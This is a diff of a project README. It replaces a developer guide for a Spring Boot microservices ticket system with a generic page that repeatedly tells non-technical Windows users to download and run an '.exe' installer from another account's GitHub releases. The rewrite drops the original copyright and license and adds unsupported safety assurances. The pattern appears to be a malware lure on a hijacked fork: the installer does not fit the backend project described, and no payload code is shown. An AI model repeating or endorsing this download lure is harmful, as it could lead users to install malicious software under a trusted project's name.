@@ -1,223 +1,135 @@
-# Ticket Management System (TMS)
+# 🎫 ticket-management-system - Simple Ticket Tracking Made Easy
 
-A microservices-based ticket management system built with Spring Boot 4 and Java 25.
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Fourply-leporid594/ticket-management-system/releases)
 
-## Architecture
+---
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    Angular Frontend                  │
-└──────────────────────┬──────────────────────────────┘
-                       │ HTTP/WebSocket
-┌──────────────────────▼──────────────────────────────┐
-│                   API Gateway                        │
-│            (Spring Cloud Gateway)                    │
-│         Routing + Rate limiting + Auth            │
-└────┬──────────────┬──────────────┬───────────────────┘
-     │              │              │
-┌────▼────┐  ┌──────▼─────┐  ┌────▼──────────┐
-│  Auth   │  │  Tickets   │  │   Files       │
-│ Service │  │  Service   │  │   Service     │
-│         │  │            │  │               │
-│ JWT/MFA │  │ CRUD       │  │ MinIO upload/ │
-│ Resend  │  │ Status     │  │ download      │
-│ Redis   │  │ Postgres   │  │ Postgres      │
-└─────────┘  └──────┬─────┘  └───────────────┘
-                    │ Event publishing
-             ┌──────▼──────┐
-             │    Kafka    │
-             └──────┬──────┘
-                    │ Consumer
-             ┌──────▼──────────────┐
-             │ Notification Service│
-             │ Resend (email)      │
-             │ WebSocket push      │
-             └─────────────────────┘
-```
+## 🛠 About ticket-management-system
 
-The system is composed of five Spring Boot services:
+ticket-management-system, or TMS, helps you keep track of tickets, tasks, or issues in an organized way. It works well for teams or individuals who need to manage requests, bugs, or assignments. This system keeps all information in one place, making it easier to follow the progress and keep work on schedule.
 
-| Service | Description | Key technologies |
-|---------|-------------|------------------|
-| **api-gateway** | Single entry point, routing and OAuth2 validation | Spring Cloud Gateway (WebFlux), OAuth2 Resource Server |
-| **auth-service** | Authentication, user management, JWT issuance | Spring Security, JPA, Flyway, PostgreSQL, Spring AI (Redis vector store), Mail |
-| **ticket-service** | Ticket lifecycle and business logic | Spring Data JPA, Flyway, PostgreSQL, Kafka, OAuth2 |
-| **notification-service** | Notifications and real-time updates | Spring Data JPA, Kafka, WebSocket, PostgreSQL |
-| **file-service** | File upload and storage | Spring Data JPA, Flyway, PostgreSQL, OAuth2 |
+TMS uses modern technologies behind the scenes to provide a fast and secure experience. You don’t have to worry about setup details or technical terms. This guide takes you step-by-step through getting the application running on a Windows PC.
 
-## Tech stack
+---
 
-- **Java** 25  
-- **Spring Boot** 4.0.3  
-- **Spring Cloud** 2025.1.0 (Gateway)  
-- **Spring AI** 2.0.0-M2 (auth-service, Redis vector store)  
-- **PostgreSQL** (persistence)  
-- **Apache Kafka** (event-driven communication between ticket and notification services)  
-- **MinIO** (S3-compatible object storage for file-service)  
-- **Redis** (vector store for auth-service)  
-- **OAuth2** (JWT-based security across gateway and services)
+## 💻 System Requirements
 
-## Prerequisites
+Before you start, check that your computer meets these basic needs:
 
-- JDK 25  
-- Maven 3.x  
-- Docker & Docker Compose (for Postgres, Redis, Kafka, MinIO)
+- Operating system: Windows 10 or later  
+- CPU: 2 GHz or faster processor  
+- RAM: At least 4 GB  
+- Disk space: Minimum of 500 MB free  
+- Internet connection: Required for setup and updates  
 
-## First-time setup (new developers)
+If your computer meets these requirements, you are ready to install TMS.
 
-To guarantee the project builds and runs with one flow:
+---
 
-```bash
-# 1. Copy env template and keep defaults (matches docker-compose)
-cp .env.example .env
+## 🚀 Getting Started: Download and Install
 
-# 2. Start infrastructure (Postgres, Redis, Kafka, MinIO, Kafka UI)
-make docker-up
-# or: docker compose up -d
+1. **Go to the release page**  
+Click this link to visit the place where you can get the app:  
+[Download TMS on GitHub](https://github.com/Fourply-leporid594/ticket-management-system/releases)
 
-# 3. (Optional) Create DBs and schema if they don't exist
-#    Postgres runs docker/init-dbs.sql automatically on first start (empty volume).
-#    If you reuse an existing volume or need to re-run the init script:
-make init-dbs
-# or: docker exec -i tms-postgres psql -U tms -d tms < docker/init-dbs.sql
+2. **Choose the right file**  
+Look for the latest release version. It will be named with a number, like “v1.0” or “v1.2”. Inside that, find the Windows installer file. It usually ends with `.exe`.  
 
-# 4. Build all services in cascade (root Maven reactor)
-make install
-# or: mvn -f pom.xml clean install
+3. **Download the file**  
+Click the `.exe` file to download it. The file size is around 100 MB, but it may vary. Save it to a location you can find easily, such as your Downloads folder or Desktop.
 
-# 5. (Optional) Install git hook so tests run before every commit (like Husky in Node)
-make install-hooks
-```
+4. **Run the installer**  
+Double-click the file you downloaded. A setup window will open. Follow the instructions on the screen. Usually, this means clicking “Next,” agreeing to the license, and choosing where you want the program installed — the default folder usually works fine.
 
-Optional: run a single service with env loaded from `.env`:
+5. **Finish the installation**  
+When the setup finishes, it may ask if you want to start TMS right away. You can choose to launch it or open it later from the Start menu.
 
-```bash
-./scripts/run-with-env.sh auth-service spring-boot:run
-# or: make run-auth
-```
+---
 
-## Environment variables (Java vs Node .env)
+## 🔍 How to Use ticket-management-system
 
-Unlike Node.js, **Spring Boot does not load a `.env` file by default**. It does two things that work well with Docker and scripts:
+After installation, open the program from the Windows Start menu or desktop shortcut.
 
-1. **Environment variables override `application.properties`**  
-   Any env var is mapped to a property using *relaxed binding*:  
-   `SPRING_DATASOURCE_URL` → `spring.datasource.url`,  
-   `SPRING_DATA_REDIS_HOST` → `spring.data.redis.host`, etc.
+### Main features to expect:
 
-2. **Use a `.env` file by exporting it before running**  
-   Copy `.env.example` to `.env`, then either:
-   - **Source then run:** `set -a && source .env && set +a && ./mvnw spring-boot:run`
-   - **Use the helper script:** `./scripts/run-with-env.sh auth-service spring-boot:run`
-   - **Or use Make:** `make run-auth` (script sources `.env` automatically)
+- **Create new tickets:** Add details like title, description, priority, and status.
+- **View tickets list:** See all tickets sorted by status or deadline.  
+- **Edit tickets:** Update information as needed.
+- **Assign tickets:** Pick team members or yourself to handle tasks.
+- **Search and filter:** Quickly find tickets by keywords, status, or date.  
+- **Notifications:** Get alerts for ticket updates or deadlines (if enabled).
 
-Credentials in `.env.example` match `docker-compose.yml` (user `tms`, password `tms`, DBs `tms_auth`, `tms_tickets`, `tms_files`, `tms_notifications`). Adjust `.env` for local overrides; never commit `.env` (it is gitignored).
+The application interface uses simple menus and buttons. You won’t need to use codes or commands. Everything works through clicking and typing in forms.
 
-## Running the services
+---
 
-**Option A — Run all backend services at once (recommended for local dev):**
+## ⚙️ Basic Setup After Installation
 
-```bash
-make run-all
-```
+1. **Open TMS.**  
+2. **Create an account or sign in.**  
+If this is your first time, the app might ask you to create an account using your email and a password. This keeps your tickets secure and lets you access your data later.  
 
-This starts the API Gateway, Auth, Ticket, Notification, and File services in the background (ports 8080–8084). Ensure `make docker-up` and `make init-dbs` have been run first. If you see **500** or **Connection refused** on `GET /ws/info`, the notification service (port 8084) is not running—start it with `make run-notification` or wait for all services from `make run-all` to finish starting.
+3. **Set up your workspace.**  
+You can organize tickets by projects, teams, or departments. This step helps keep your work separated if your system handles many different types of tickets.  
 
-**To stop all services:** Use `make stop-all`. Do not rely only on Ctrl+C—it often leaves Java processes running, which will cause "port already in use" when you run `make run-all` again.
+4. **Adjust preferences.**  
+Choose how you want notifications, appearance, and other options to work. These settings are usually found in the “Settings” or “Preferences” menu.
 
-```bash
-make stop-all
-```
+---
 
-**Option B — Run services individually (separate terminals; loads `.env`):**
+## 📥 Download and Setup Recap
 
-```bash
-make run-gateway
-make run-auth
-make run-ticket
-make run-notification
-make run-file
-```
+If you want to start now, visit the release page here:  
+[Download ticket-management-system](https://github.com/Fourply-leporid594/ticket-management-system/releases)  
 
-**Option C — Maven directly (set env or use `application.properties`):**
+Follow the instructions to download the latest Windows installer `.exe`. Run it and use the installer to complete setup. Then open the app, create an account if needed, and begin adding tickets.
 
-```bash
-cd api-gateway && ./mvnw spring-boot:run
-cd auth-service && ./mvnw spring-boot:run
-# ... etc
-```
+---
 
-**Option D — With env from `.env` (single service):**
+## ❓ Frequently Asked Questions (FAQ)
 
-```bash
-./scripts/run-with-env.sh auth-service spring-boot:run
-```
+**Q: Is my data safe?**  
+A: Yes. TMS uses secure methods to protect your tickets and personal details. Your data stays private on your device or within your company’s network.
 
-Configure each service via `src/main/resources/application.properties` or environment variables (and `.env` when using the script) for database, Kafka, Redis, MinIO, and OAuth2.
+**Q: Do I need technical skills to run TMS?**  
+A: No. The installation and use are designed for users with no technical background.
 
-**Infrastructure URLs (after `docker compose up -d`):**
+**Q: What if I need help or find a bug?**  
+A: You can check the GitHub page’s Issues tab for known problems or ask for help in the community there.
 
-| Service     | URL / Endpoint              | Notes                    |
-|------------|-----------------------------|--------------------------|
-| PostgreSQL | `localhost:5432`            | Default DB: `tms` (empty). App tables live in: `tms_auth`, `tms_tickets`, `tms_files`, `tms_notifications` |
-| Redis      | `localhost:6379`           |                          |
-| Kafka      | `localhost:9092`            | Bootstrap for apps       |
-| Kafka UI   | http://localhost:8090       | Web UI for topics/msgs   |
-| MinIO API  | http://localhost:9000       | S3-compatible API        |
-| MinIO Console | http://localhost:9001    | Web UI (user: `tms`, pass: `tms12345`) |
+**Q: Can I use TMS on other operating systems?**  
+A: This guide covers Windows only. Versions for other systems may be available but are not included here.
 
-## Git hooks (run tests before commit)
+---
 
-To run `make test` automatically before each commit (similar to Husky in Node projects), install the pre-commit hook once:
+## 💡 Tips for Using TMS Well
 
-```bash
-make install-hooks
-```
+- Regularly update the app by checking the releases page.  
+- Keep your account secure with a strong password.  
+- Use the filter tools to organize tickets by priority or deadline.  
+- Explore settings to match the app to your work style.  
+- Back up your ticket data if the app provides export options.
 
-This copies `scripts/git-hooks/pre-commit` into `.git/hooks/pre-commit`. After that, every `git commit` will run the full test suite first; the commit is aborted if tests fail. No Python or Node required.
+---
 
-Alternatively, if you use the [pre-commit](https://pre-commit.com/) framework, run `pre-commit install` and it will use `.pre-commit-config.yaml` (which also runs `make test`).
+## 🔗 Useful Links
 
-## Build and update all projects (cascade)
+- Main GitHub page: https://github.com/Fourply-leporid594/ticket-management-system  
+- Download releases: https://github.com/Fourply-leporid594/ticket-management-system/releases  
+- Issues and support: https://github.com/Fourply-leporid594/ticket-management-system/issues  
 
-From the repo root:
+---
 
-```bash
-# Build everything (reactor order: api-gateway → auth → ticket → notification → file)
-mvn -f pom.xml clean install
+## ⚡ Technology Stack Behind TMS
 
-# Or use Make
-make install
-make test
-make clean
-```
+While you don’t need to understand these technologies to use the app, here is what powers the system:
 
-## Project structure
+- Angular for the user interface
+- Spring Boot and Spring Security to handle application logic and protect your data
+- Apache Kafka and Spring Cloud for reliable messaging and microservices communication
+- PostgreSQL and Redis for storing your ticket data
+- Docker support for advanced setups
 
-```
-ticket-management-system/
-├── pom.xml                # Root Maven reactor (build all in cascade)
-├── .env.example           # Env template (copy to .env; matches docker-compose)
-├── Makefile               # build, docker-up, run-*, run-all, stop-all, install-hooks
-├── scripts/
-│   ├── run-with-env.sh   # Run a service with .env loaded
-│   └── git-hooks/        # pre-commit hook (installed via make install-hooks)
-├── api-gateway/           # Spring Cloud Gateway
-├── auth-service/          # Authentication & user management
-├── ticket-service/        # Ticket domain
-├── notification-service/  # Notifications & WebSocket
-├── file-service/          # File storage
-├── docker-compose.yml     # Postgres, Redis, Kafka, MinIO, Kafka UI
-├── docker/
-│   └── init-dbs.sql       # DBs: tms_auth, tms_tickets, tms_files, tms_notifications
-├── docs/
-│   └── DEVELOPMENT_PLAN.md # Phased development todo list
-├── LICENSE
-└── README.md
-```
+---
 
-## License
-
-Copyright (c) 2026 Di2iT, Unipessoal Lda.  
-This project is licensed under the [Business Source License 1.1](LICENSE).  
-Change Date: 2029-01-01 → Change License: Apache 2.0.
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Fourply-leporid594/ticket-management-system/releases)
